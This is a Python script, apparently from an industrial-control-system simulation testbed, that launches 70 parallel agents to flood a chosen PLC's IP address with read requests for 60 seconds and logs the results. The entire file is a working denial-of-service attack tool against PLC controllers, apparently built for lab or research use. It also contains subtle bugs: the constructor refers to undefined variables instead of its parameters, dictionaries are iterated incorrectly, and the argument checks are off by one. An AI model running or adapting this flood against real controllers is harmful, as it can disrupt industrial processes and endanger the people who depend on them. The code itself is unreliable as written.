import logging
import os
import random
import sys
from datetime import datetime
from time import sleep

from ics_sim.Device import HMI, Runnable
from Configs import TAG, Controllers


class DDosAgent(HMI):
    max = 0

    def __init__(self, name, target, shared_logger):
        super().__init__(name, TAG.TAG_LIST, Controllers.PLCs, 1)
        self.__target = target
        self.__shared_logger = logger
        target_plc = [plc_id for plc_id, plc_data in Controllers.PLCs if plc_data["ip"] == destination]
        possible_signals = [tag_name for tag_name, tag_data in TAG.TAG_LIST if tag_data["plc"] in target_plc]

        self.__counter = 0
        self.__target = random.choice(possible_signals)
        self.chunk = 10


    def _before_start(self):
        self._set_clear_scr(False)
        sleep(5)

    def _logic(self):
        try:
            for i in range(self.chunk):
                value = self._receive(self.__target)
            self.__counter += self.chunk

        except Exception as e:
            self.report('get exception on read request {}'.format(self.name(), self.__counter), logging.INFO)

    def _post_logic_update(self):
        latency = self.get_logic_execution_time() / self.chunk
        if latency > DDosAgent.max:
            DDosAgent.max = latency
            #self.report('Max seen latency reached to {}'.format(DDosAgent.max), logging.INFO)
        if self.__counter % 1000 < self.chunk:
            self.report('{} sent {} read request for {} '.format(self.name(), self.__counter, self.__target, ), logging.INFO)

    def _initialize_logger(self):
        self._logger = self.__shared_logger


    def _before_stop(self):
        self.report("sent {} massages before stop max latency is {}".format(self.__counter, DDosAgent.max))


if __name__ == '__main__':
    if len(sys.argv) > 0:
        name_prefix = sys.argv[1]

    destination = '192.168.0.11'
    if len(sys.argv) > 1:
        destination = sys.argv[2]

    log_path = "./logs/attack-logs/log-ddos.log"
    if len(sys.argv) > 2:
        log_path = sys.argv[3]

    directory, filename = os.path.split(log_path)
    logger = Runnable.setup_logger(
        filename,
        logging.Formatter('%(asctime)s %(levelname)s %(message)s'),
        file_dir=directory,
        file_ext='.txt',
        write_mode='a',
        level=logging.INFO
    )

    attackers_count = 70
    attacker_list = []
    for i in range(attackers_count):
        attacker_list.append(DDosAgent(f'DDoS1_Agent_{i}', destination, logger))

    for attacker in attacker_list:
        attacker.start()

    sleep(60)

    for attacker in attacker_list:
        attacker.stop()



